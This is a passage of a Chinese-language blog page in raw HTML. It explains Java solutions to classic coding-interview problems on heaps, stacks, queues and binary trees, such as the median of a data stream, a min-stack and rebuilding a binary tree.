arr)&#123;<br>        <span class="hljs-keyword">if</span> (pq.size() &lt; k)&#123;<br>            pq.offer(num);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num &lt; pq.peek())&#123;<br>            pq.poll();<br>            pq.offer(num);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//返回堆中元素</span><br>    <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[pq.size()];<br>    <span class="hljs-keyword">int</span> idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : pq) &#123;<br>        res[idx++] = num;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>方法三：快排</p><h2 id="3-2-数据流中的中位数"><a href="#3-2-数据流中的中位数" class="headerlink" title="3.2 数据流中的中位数"></a>3.2 数据流中的中位数</h2><p>​    题目：如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。</p><p>例如，</p><p>[2,3,4] 的中位数是 3</p><p>[2,3] 的中位数是 (2 + 3) / 2 = 2.5</p><p>设计一个支持以下两种操作的数据结构：</p><ul><li>void addNum(int num)     - 从数据流中添加一个整数到数据结构中。</li><li>double findMedian()         - 返回目前所有元素的中位数。</li></ul><p>方法一：</p><blockquote><p>​    给定一长度为 N 的无序数组，其中位数的计算方法：首先对数组执行排序O(NlogN) 时间），然后返回中间元素即可（使用 O(1) 时间）。</p></blockquote><p>​    根据以上思路，可以将数据流保存在一个列表中，并在添加元素时 保持数组有序 。此方法的时间复杂度为 O(N) ，其中包括： 查找元素插入位置 O(logN) （二分查找）、向数组某位置插入元素 O(N) （插入位置之后的元素都需要向后移动一位）。</p><p>方法二：</p><blockquote><p>借助 <strong>堆</strong> 可进一步优化时间复杂度。</p></blockquote><p>​    建立一个 <strong>小顶堆</strong> <em>A</em> 和 <strong>大顶堆</strong> <em>B</em> ，各保存列表的一半元素，且规定：</p><ul><li>A 保存 较大 的一半，长度为 $\frac{N}{2} $（ N 为偶数）或 $\frac{N+1}{2}$ （ N 为奇数）；</li><li>B 保存 较小 的一半，长度为 $\frac{N}{2} $（ N 为偶数）或 $\frac{N-1}{2}$ （ N 为奇数）；</li></ul><p>随后，中位数可仅根据 <em>A</em>,<em>B</em> 的堆顶元素计算得到。</p><p>算法流程：</p><blockquote><p>设元素总数为 N = m + n，其中 m 和 n 分别为 A 和 B 中的元素个数。</p></blockquote><p>addNum(num) 函数：</p><ol><li><p>当m=n（即 N 为 偶数）：需向 A 添加一个元素。实现方法：将新元素 num 插入至 B ，再将 B 堆顶元素插入至 A ；</p></li><li><p>当 m!=n（即 N 为奇数）：需向 B 添加一个元素。实现方法：将新元素 num 插入至 A ，再将 A 堆顶元素插入至 B ；</p><blockquote><p>假设插入数字 num 遇到情况 1. 。由于 num 可能属于 “较小的一半” （即属于 B ），因此不能将 nums 直接插入至 A 。而应先将 num 插入至 B ，再将 B 堆顶元素插入至 A 。这样就可以始终保持 A 保存较大一半、 B 保存较小一半。</p></blockquote></li></ol><p>findMedian() 函数：</p><p>当 m=n（ N 为 偶数）：则中位数为 ( A 的堆顶元素 + B 的堆顶元素 )/2。</p><p>当m!=n（ N 为 奇数）：则中位数为 A 的堆顶元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MedianFinder</span> </span>&#123;<br><br>    Queue&lt;Integer&gt; A, B;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MedianFinder</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 小顶堆，保存较大的一半</span><br>        A = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;();<br>        <span class="hljs-comment">// 大顶堆，保存较小的一半</span><br>        B = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;((x, y) -&gt; (y - x));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addNum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(A.size()!=B.size())&#123;<br>            A.add(num);<br>            B.add(A.poll());<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            B.add(num);<br>            A.add(B.poll());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">findMedian</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> A.size() != B.size() ? A.peek() : (A.peek() +B.peek())/<span class="hljs-number">2.0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-栈-队列"><a href="#4-栈-队列" class="headerlink" title="4. 栈/队列"></a>4. 栈/队列</h1><h2 id="4-1-用两个栈实现队列"><a href="#4-1-用两个栈实现队列" class="headerlink" title="4.1 用两个栈实现队列"></a>4.1 用两个栈实现队列</h2><p>​    题目：用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。</p><p>​    队列的特性是先进先出，栈的特性是后进先出，两个栈不就是先进先出了吗，难点在于两个栈怎样配合，因为栈2有值时栈1不能pop(栈2push)，这样无法保持队列先进先出的特性。</p><p>​    规则是：栈2空时，栈1才能pop，而且必须全部pop，不然部分pop栈1push仍然会无法保持队列先进先出的特性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JZ5</span> </span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。</span><br><span class="hljs-comment">    * */</span><br><br>    Stack&lt;Integer&gt; stack1 = <span class="hljs-keyword">new</span> Stack&lt;Integer&gt;();<br>    Stack&lt;Integer&gt; stack2 = <span class="hljs-keyword">new</span> Stack&lt;Integer&gt;();<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-keyword">int</span> node)</span> </span>&#123;<br>        stack1.push(node);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (stack2.empty())&#123;<br>            <span class="hljs-keyword">while</span> (!stack1.empty())&#123;<br>                stack2.push(stack1.pop());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stack2.pop();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-包含min函数的栈"><a href="#4-2-包含min函数的栈" class="headerlink" title="4.2 包含min函数的栈"></a>4.2 包含min函数的栈</h2><p>​    题目：定义栈的数据结构，请在该类型中实现一个能够得到栈的最小元素的 min 函数在该栈中，调用 min、push 及 pop 的<font color="red">时间复杂度都是 O(1)</font>。</p><blockquote><p> 普通栈的 <code>push()</code> 和 <code>pop()</code> 函数的复杂度为 O*(1) ；而获取栈最小值 <code>min()</code> 函数需要遍历整个栈，复杂度为 O(N) 。</p></blockquote><ul><li>难点：将min()函数复杂度降为O(1)，可通过辅助栈实现。<ul><li>数据栈A:栈 A 用于存储所有元素，保证入栈 <code>push()</code> 函数、出栈 <code>pop()</code> 函数、获取栈顶 <code>top()</code> 函数的正常逻辑。</li><li>辅助栈B:栈 B 中存储栈 A 中所有非严格降序的元素，则栈 A 中的最小元素始终对应栈 B 的栈顶元素，即 min() 函数只需返回栈 B 的栈顶元素即可。</li></ul></li><li>因此，只需设法维护好 栈 B的元素，使其保持非严格降序，即可实现 <code>min()</code> 函数的 O(1)复杂度。</li></ul><p><img src="https://pic.leetcode-cn.com/f31f4b7f5e91d46ea610b6685c593e12bf798a9b8336b0560b6b520956dd5272-Picture1.png" alt="Picture1.png" style="zoom: 50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Stack;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MinStack</span> </span>&#123;<br><br>    <span class="hljs-comment">/** initialize your data structure here. */</span><br>    Stack&lt;Integer&gt; A,B;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MinStack</span><span class="hljs-params">()</span> </span>&#123;<br>        A = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>        B = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>        A.add(x);<br>        <span class="hljs-keyword">if</span>(B.empty() || x&lt;=B.peek())&#123;<br>            B.add(x);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (A.pop().equals(B.peek()))&#123;<br>            B.pop();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> A.peek();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">min</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> B.peek();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>stack.peek()作用为返回栈顶元素而不删除。</li><li>注意B.empty() || x&lt;=B.peek()前后不能颠倒，因为先判断前面，||有短路作用。</li></ul><h2 id="4-3-栈的压入、弹出序列"><a href="#4-3-栈的压入、弹出序列" class="headerlink" title="4.3 栈的压入、弹出序列"></a>4.3 栈的压入、弹出序列</h2><p>​    题目：输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如，序列 {1,2,3,4,5} 是某栈的压栈序列，序列 {4,5,3,2,1} 是该压栈序列对应的一个弹出序列，但 {4,3,5,1,2} 就不可能是该压栈序列的弹出序列。</p><p>辅助栈，模拟</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">validateStackSequences</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] pushed, <span class="hljs-keyword">int</span>[] popped)</span> </span>&#123;<br>    Stack&lt;Integer&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : pushed)&#123;<br>        stack.push(num);<br>        <span class="hljs-keyword">while</span> (!stack.isEmpty() &amp;&amp; stack.peek() == popped[i])&#123;<br>            stack.pop();<br>            i++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> stack.isEmpty();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-4-队列的最大值"><a href="#4-4-队列的最大值" class="headerlink" title="4.4 队列的最大值"></a>4.4 队列的最大值</h2><p>​    题目：请定义一个队列并实现函数 max_value 得到队列里的最大值，要求函数max_value、push_back 和 pop_front 的均摊时间复杂度都是O(1)。</p><p>若队列为空，pop_front 和 max_value 需要返回 -1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] q = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">20000</span>];<br>   <span class="hljs-keyword">int</span> begin = <span class="hljs-number">0</span>, end = <span class="hljs-number">0</span>;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MaxQueue</span><span class="hljs-params">()</span> </span>&#123;<br><br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">max_value</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">int</span> ans = -<span class="hljs-number">1</span>;<br>       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = begin; i != end; ++i)&#123;<br>           ans = Math.max(ans,q[i]);<br>       &#125;<br>       <span class="hljs-keyword">return</span> ans;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">push_back</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>       q[end++] = value;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pop_front</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">if</span> (begin == end)&#123;<br>           <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>       &#125;<br>       <span class="hljs-keyword">return</span> q[begin++];<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="5-树"><a href="#5-树" class="headerlink" title="5. 树"></a>5. 树</h1><h2 id="5-1-重建二叉树"><a href="#5-1-重建二叉树" class="headerlink" title="5.1 重建二叉树"></a>5.1 重建二叉树</h2><p>​    题目：输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。</p><p>​    重建二叉树是二叉树中非常基本的题目，在草稿上重建很简单，怎么在代码中实现。</p><p>​    在草稿上可以看出重建二叉树是重复的完成动作，不断的在划分出的子序列中去递归子树。因此使用递归。</p><p>​    注意<font color='red'>Arrays.copyOfRange(T[ ] original,int from,int to)</font>这个方法，是将一个原始的数组original，从下标from开始复制，复制到上标to，生成一个新的数组。注意这里包括下标from，<strong>不包括</strong>上标to。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TreeNode</span> </span>&#123;<br>          <span class="hljs-keyword">int</span> val;<br>          TreeNode left;<br>         TreeNode right;<br>         TreeNode(<span class="hljs-keyword">int</span> x) &#123; val = x; &#125;<br>      &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JZ4</span> </span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。</span><br><span class="hljs-comment">     * 假设输入的前序遍历和中序遍历的结果中都不含重复的数字。</span><br><span class="hljs-comment">     * 例如输入前序遍历序列&#123;1,2,4,7,3,5,6,8&#125;和中序遍历序列&#123;4,7,2,1,5,3,8,6&#125;，</span><br><span class="hljs-comment">     * 则重建二叉树并返回。</span><br><span class="hljs-comment">     * */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] pre = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>&#125;;<br>        <span class="hljs-keyword">int</span>[] in  = &#123;<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>&#125;;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">reConstructBinaryTree</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] pre, <span class="hljs-keyword">int</span>[] in)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (pre.length==<span class="hljs-number">0</span>||in.length==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">//递归出口</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        TreeNode root = <span class="hljs-keyword">new</span> TreeNode(pre[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;in.length;i++)&#123;<br>            <span class="hljs-keyword">if</span> (in[i] == pre[<span class="hljs-number">0</span>])&#123;<br>                root.left = reConstructBinaryTree(Arrays.copyOfRange(pre,<span class="hljs-number">1</span>,i+<span class="hljs-number">1</span>),Arrays.copyOfRange(in,<span class="hljs-number">0</span>,i));<br>                root.right = reConstructBinaryTree(Arrays.copyOfRange(pre,i+<span class="hljs-number">1</span>,pre.length),Arrays.copyOfRange(in,i+<span class="hljs-number">1</span>,in.length));<br>                <span class="hljs-comment">//循环出口</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-2-树的子结构"><a href="#5-2-树的子结构" class="headerlink" title="5.2 树的子结构"></a>5.2 树的子结构</h2><p>​    题目：输入两棵二叉树A，B，判断B是不是A的子结构。（ps：我们约定空树不是任意一个树的子结构）</p><p>​    和链表相比，树的操作更多也更复杂，因此与树相关的问题通常会比链表的要难。如果想加大面试的难度，树的题目是很多面试官的选择。</p><p>​    首先遍历二叉树A，当A的结点值m_value和B根节点值相同时判断B的结构和m_value是否相同。显然，遍历和判断是两个函数，并且都可使用递归。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isSubStructure</span><span class="hljs-params">(TreeNode A, TreeNode B)</span> </span>&#123;<br>       <span class="hljs-keyword">if</span> (A == <span class="hljs-keyword">null</span> || B == <span class="hljs-keyword">null</span>) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>       &#125;<br>       <span class="hljs-comment">//先序遍历</span><br>       <span class="hljs-keyword">if</span> (A.val == B.val &amp;&amp; recur(A.left, B.left) &amp;&amp; recur(A.right, B.right)) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>       &#125;<br>       <span class="hljs-keyword">return</span> isSubStructure(A.left, B) ||  isSubStructure(A.right, B);<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">recur</span><span class="hljs-params">(TreeNode A, TreeNode B)</span> </span>&#123;<br>       <span class="hljs-comment">//判断A,b结构是否相同</span><br><br>       <span class="hljs-comment">//递归出口</span><br>       <span class="hljs-keyword">if</span> (B == <span class="hljs-keyword">null</span>) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>       &#125;<br>       <span class="hljs-keyword">if</span> (A == <span class="hljs-keyword">null</span>) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>       &#125;<br><br><br>       <span class="hljs-comment">//向下递归</span><br>       <span class="hljs-keyword">if</span> (A.val == B.val)&#123;<br>           <span class="hljs-keyword">return</span> recur(A.left, B.left) &amp;&amp; recur(A.right, B.right);<br>       &#125;<span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>       &#125;<br>       <br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="5-3-二叉树的镜像"><a href="#5-3-二叉树的镜像" class="headerlink" title="5.3 二叉树的镜像"></a>5.3 二叉树的镜像</h2><p>题目：请完成一个函数，输入一个二叉树，该函数输出它的镜像</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">mirrorTree</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-comment">//递归出口</span><br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    <br>        &#125;<br><br>        <span class="hljs-comment">//递归,直接交换结点不交换值</span><br>        TreeNode tmp = root.left;<br>        root.left = mirrorTree(root.right);<br>        root.right = mirrorTree(tmp);<br>        <br>        <br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-4-对称的二叉树"><a href="#5-4-对称的二叉树" class="headerlink" title="5.4 对称的二叉树"></a>5.4 对称的二叉树</h2><p>​    题目：请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-comment">//判断树是否是对称</span><br>    <span class="hljs-keyword">return</span> root == <span class="hljs-keyword">null</span> || recur(root.left, root.right);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">recur</span><span class="hljs-params">(TreeNode L, TreeNode R)</span> </span>&#123;<br>    <span class="hljs-comment">//判断两个树是否镜像</span><br>    <span class="hljs-keyword">if</span> (L == <span class="hljs-keyword">null</span> &amp;&amp; R == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (L == <span class="hljs-keyword">null</span> || R == <span class="hljs-keyword">null</span> || L.val != R.val)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> recur(L.left,R.right) &amp;&amp; recur(L.right,R.left);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-5-从上到下打印二叉树Ⅰ"><a href="#5-5-从上到下打印二叉树Ⅰ" class="headerlink" title="5.5 从上到下打印二叉树Ⅰ"></a>5.5 从上到下打印二叉树Ⅰ</h2><p>​    题目：从上到下打印出二叉树的每个节点，同一层的节点按照从左到右的顺序打印。</p><p>​    层次遍历二叉树</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] levelOrder(TreeNode root) &#123;<br>    <span class="hljs-comment">//利用队列的先进先出特性</span><br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>    Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;()&#123;&#123;add(root);&#125;&#125;;<br>    ArrayList&lt;Integer&gt; ans = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    <span class="hljs-keyword">while</span> (!queue.isEmpty())&#123;<br>        TreeNode treeNode = queue.poll();<br>        ans.add(treeNode.val);<br>        <span class="hljs-keyword">if</span> (treeNode.left != <span class="hljs-keyword">null</span>)&#123;<br>            queue.add(treeNode.left);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (treeNode.right != <span class="hljs-keyword">null</span>)&#123;<br>            queue.add(treeNode.right);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span 